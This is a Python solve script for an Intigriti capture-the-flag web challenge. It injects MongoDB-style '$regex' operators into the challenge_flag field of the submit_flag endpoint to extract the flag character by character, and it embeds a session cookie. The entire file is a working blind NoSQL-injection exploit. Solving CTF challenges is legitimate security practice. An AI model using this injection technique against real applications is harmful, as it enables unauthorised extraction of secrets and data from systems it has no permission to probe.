#!/usr/bin/python3
import string
# Don't use ProcessPoolExecutor
from concurrent.futures import ThreadPoolExecutor
from typing import Union

import requests

url = "https://ctfc.ctf.intigriti.io/"
characters = (
    string.ascii_lowercase + string.ascii_uppercase + string.digits + '_@{}-/()!"%=:;'
)

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Content-Type": "application/json",
    "Connection": "keep-alive",
    "Cookie": "session=eyJ1c2VyIjp7Il9pZCI6ImZiNDgyMzNlMGY3NjQ3YmM5NTE0OTdkMzlkZDlhYzVhIiwidXNlcm5hbWUiOiJqYWR1In19.ZVgESw.SAKorWjKxYthpHKW7WNtxv7_AqY",
}


def check_char(char: str) -> Union[str, None]:
    data = {"_id": "_id:3", "challenge_flag": {"$regex": f"^{flag+char}"}}
    r = requests.post(url + "submit_flag", json=data, headers=headers)
    if "correct flag!" in r.text:
        return char
    return None


if __name__ == "__main__":
    # we know the first 10 chars of the flag
    # flag = "INTIGRITI{"
    flag = "INTIGRITI{h0w_1s_7h4t_PAWSIBLE"

    print("[*] Working....")
    with ThreadPoolExecutor(max_workers=5) as executor:
        while True:
            possible_chars = list(executor.map(check_char, characters))
            valid_chars = [char for char in possible_chars if char is not None]

            if valid_chars:
                flag += valid_chars[0]
            else:
                break

            print(f"[*] Current Flag: {flag}")

            if flag.endswith("}"):
                break

    print(f"[*] Final Flag: {flag}")
